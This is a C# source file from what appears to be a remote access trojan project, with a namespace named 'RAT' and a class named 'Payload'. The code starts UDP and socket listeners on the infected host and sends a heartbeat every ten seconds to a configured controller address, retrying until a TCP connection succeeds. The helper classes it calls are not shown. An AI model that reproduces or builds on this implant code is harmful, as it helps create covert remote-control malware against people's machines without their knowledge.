using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RAT
{
    class Payload
    {
        public static Int32 port;
        public static String ServerIP;
        public static void main()
        {
            UDPListener listener = new UDPListener();
            listener.startR();
            Task.Factory.StartNew(() => HeartBeat());
        }
        public static void HeartBeat()
        {
            Task.Factory.StartNew(() => AsynchronousSocketListener.StartListening());
            while (true)
            {
                Send("<HEARTBEAT> 192.168.0.45");
                Thread.Sleep(10000);
            }
        }
        public static void Send(String message)
        {
            bool sending = true;
            while (sending)
            {
                if (CheckConnection())
                {
                    AsynchronousClient.StartClient(message, port, ServerIP);
                    sending = false;
                }
            }
        }
        public static bool CheckConnection()
        {
            using (TcpClient tcpClient = new TcpClient())
            {
                try
                {
                    tcpClient.Connect(ServerIP, port);
                    Console.WriteLine("Connecting");
                    return true;
                }
                catch (Exception)
                {
                    Console.WriteLine("Cannot Connect");
                    Thread.Sleep(200);
                    return false;
                }
            }
        }
    }
    }